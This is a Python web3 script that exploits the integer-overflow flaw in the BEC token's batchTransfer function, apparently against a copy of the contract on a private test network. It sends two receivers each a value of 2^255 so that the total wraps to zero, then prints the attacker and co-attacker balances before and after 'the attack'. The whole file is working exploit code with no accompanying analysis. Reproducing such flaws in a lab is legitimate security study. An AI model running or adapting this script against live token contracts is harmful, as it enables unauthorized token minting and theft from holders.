import time
from web3 import Web3
from web3.auto import w3
from hexbytes import HexBytes
from attrdict import AttrDict
from solc import compile_source
from web3.contract import ConciseContract

# The address is printed by deploy_bec.py on the node of contract constructor.
contract_address = "0x7f73d209B649108DCcF73Fe996713A23BBfd4fBA"
# Path of the source code of the BEC contract
sol_path = "/media/sf_Shared_Folder/bec-contrace_kmdebug.sol"
interface_keystr = '<stdin>:BecToken'

# we need two accounts and the sender should have some eth on the private network
sender = w3.eth.accounts[0]
coattacker = w3.eth.accounts[1]
sender_pin = "  " # password to unlock the sender
value = 0x8000000000000000000000000000000000000000000000000000000000000000

# connecting to SMT constract
contract_file = open(sol_path)
contract_soucecode = contract_file.read()
compiled_sol = compile_source(contract_soucecode)

contract_interface = compiled_sol[interface_keystr]
contract = w3.eth.contract(address=contract_address, abi=contract_interface['abi'])

print("Balance of Co-attacker Before Attack: " + hex(contract.functions.balanceOf(coattacker).call()))
print("Balance of Sender Before Attack: " + hex(contract.functions.balanceOf(sender).call()))

# generating signing values
receivers = [sender, coattacker]
func = contract.functions.batchTransfer(receivers, value)
gas = func.estimateGas()
print("The Gas that we are going to pay is " + str(gas))
w3.personal.unlockAccount(sender, sender_pin)
trans_id = func.transact(transaction={'from': sender, 'gas': gas })

while True:
    rect = w3.eth.getTransactionReceipt(trans_id)
    if rect != None:
        print("RECEIPT: " + str(rect))
        evt = contract.events.Transfer().processReceipt(rect)
        print("EVENT: " + str(evt[0]['args']))
        print("EVENT: " + str(evt[1]['args']))
        break
    time.sleep(1)

print("Balance of Co-attacker After Attack: " + hex(contract.functions.balanceOf(coattacker).call()))
print("Balance of Sender After Attack: " + hex(contract.functions.balanceOf(sender).call()))
